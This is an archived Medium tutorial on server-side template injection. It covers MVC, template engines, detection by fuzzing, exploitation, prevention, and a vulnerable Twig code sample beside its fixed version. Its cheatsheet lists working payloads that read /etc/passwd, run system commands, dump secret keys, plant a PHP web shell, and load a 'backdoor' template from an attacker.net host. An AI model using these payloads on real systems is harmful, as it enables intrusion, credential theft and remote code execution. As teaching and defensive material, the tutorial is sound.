# WebSec — SSTI (Server Site Template Injection)

- **Source URL:** https://medium.com/@meryemddalgali/websec-ssti-server-site-template-injection-1a9603caa51e?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20260605062626/https://medium.com/@meryemddalgali/websec-ssti-server-site-template-injection-1a9603caa51e
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/7048 (id 7048)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# WebSec — SSTI (Server Site Template Injection)

Before starting the Server Side Template Injection vulnerability, it is necessary to examine the MVC approach used in applications, the template structure, and the functioning of this structure.

### **What is MVC Architecture?**

In complex applications, software architectural approaches such as MVC have emerged with the intertwining of backend and frontend components and the difficulty of reading the written codes. It allows the code to be better organized (Frontend-Backend).

MVC is formed from the initials of the words Model-View-Controller.

The figure shows the relationship between View, Controller, Model, Client.

- **Model:** This is where the data is processed or stored.
- **View:** The user interface. It allows to view and modify the data.
- **Controller:** Management of the workflow. The request is handled by the controller. It gives the appropriate view with the model data as a response.

To summarise: The users tells the Controller layer what they want thanks to the routes defined to the web application. Controller layer; If there is any data operation among the user’s requests, it performs the necessary operations to the Model layer and receives the answer. It transmits the answer it receives to the View layer. The View layer prepares the answer that the user needs to see and transmits it to the user.

- The MVC architecture is widely used in web applications that work with template engines. The request is usually received by the controller and processed on the model. The response is sent to the user’s browser via the View component. If the user input is not processed correctly during this process, SSTI vulnerability may occur.

### What are Template Engines**?**

Template engines are located in the ‘View’ layer of the MVC architecture. It processes the data coming from the Controller layer and transmits it to the user in HTML format. In other words, it is designed to be used to make applications more dynamic and to create dynamic web pages by combining fixed templates with temporary data.

The most commonly used template engines according to software languages are as follows:

- •PHP — Smarty, Twig
- •Java — Velocity, Freemaker
- •Python — Jinja2, Mako, Tornado
- •JavaScript — Jade, Rage
- •Ruby — Liquid

### What is SSTI**?**

SSTI is the attacker’s ability to trigger unwanted behaviors on the application server or access sensitive data by injecting malicious payloads into the template executed on the server side. The vulnerability occurs when the dynamic data of the user is processed in the template on the server.

The main factor in the formation of SSTI is INPUTs.

- Data read from databases
- Content of a file on a disc
- Data from HTTP traffic
- Data from 3rd party applications

‘Briefly, all the data processed from the outside world to the workflow of the application is an input.’


### Vulnerability Detection

Considering the possibility that all input points in a web test are potentially used in the template, we can try to detect the vulnerability by manipulating the inputs.

The simplest initial approach is to send meta characters ${{{\<%\[‘\’}}} to an input and see what kind of response it gets in the response. This process is called Fuzzing (return error, missing character, etc.)

We can go to the received error and arrive at the template engine type here.

On the other hand, if we do not get an error but get a response with missing characters in the meta characters we send, it is understood that the missing character is somehow interpreted on the server side.

We can also use the following template to find out if the application is vulnerable and which type of template engine it uses. However, in some cases the template will be insufficient.

### Exploitation of Vulnerability

The next step after defining the template engine is to read the documents. The second step is the exploration part. Exploring the environment to find out exactly what you have access to. You can expect to find both default objects provided by the template engine and application specific objects passed to the template by the developer.

Many template engines provide a core object or namespace object that contains everything in scope and provides an idiomatic way to list the properties and methods of an object.

In the third step, the attack part, we need to have a solid idea of the attack surface we can use and be able to proceed with traditional security auditing techniques by reviewing each function for vulnerabilities in terms of exploitability. It is important to approach this in the context of a wider application. Some functions can be used to exploit application-specific features. The examples to follow will use template injection to trigger arbitrary object creation, arbitrary file read/write, remote file inclusion, information disclosure and privilege escalation vulnerabilities.

Payload: *{php}$s = file\_get\_contents(‘/etc/passwd’,NULL, NULL, 0, 100); var\_dump($s);{/php}*

### Cheatsheet:

```
Generic
${{<%[%'"}}%\.
{% debug %}
{7*7}
{{ '7'*7 }}
{2*2}[[7*7]]
<%= 7 * 7 %>
#{3*3}
#{ 3 * 3 }
[[3*3]]
${2*2}
@(3*3)
${= 3*3}
{{= 7*7}}
${{7*7}}
#{7*7}
[=7*7]
{{ request }}
{{self}}
{{dump(app)}}
{{ [] .class.base.subclassesO }}
{{''.class.mro()[l] .subclassesO}}
for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
{{ []._class.base.subclasses_O }}
{{['cat%20/etc/passwd']|filter('system')}}
PHP 
{php}print "Hello"{/php}
{php}$s = file_get_contents('/etc/passwd',NULL, NULL, 0, 100); var_dump($s);{/php}
{{dump(app)}}
{{app.request.server.all|join(',')}}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{$smarty.version}
{php}echo id;{/php}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
Python
{% debug %}
{{settings.SECRET_KEY}}
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
```
### Vulnerability Prevention

- Users should not be authorized to edit and add templates
- Updating the plugins and additional products of 3rd party web applications used
- Input Sterilization
- Use Logic-Less Template Engine (like Mustache)

### Code Review

```
<?php
include 'vendor/twig/twig/lib/Twig/Autoloader.php';
$name = $_GET['name'];
Twig_Autoloader::register();
$loader = new Twig_Loader_Array(array(
    'index' => $name,
));
$twig = new Twig_Environment($loader);
try {
    $result = $twig->render('index');
    echo $result;
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
}
?>
```
SSTI vulnerability will occur when the input received from the user ($\_GET\[‘name’\]) is sent directly to the template engine (Twig). In order to prevent the vulnerability, the code should be edited as follows.

```
<?php
include 'vendor/twig/twig/lib/Twig/Autoloader.php';
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8'); // Kullanıcı girdisini temizliyoruz
Twig_Autoloader::register();
$loader = new Twig_Loader_Array(array(
    'index' => 'Hello, {{ name }}!', // Kullanıcı girdisi sadece değişken olarak kullanılıyor
));
$twig = new Twig_Environment($loader);
try {
    $result = $twig->render('index', array('name' => $name)); // Girdi şablona güvenli bir şekilde ekleniyor
    echo $result;
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
}
?>
```
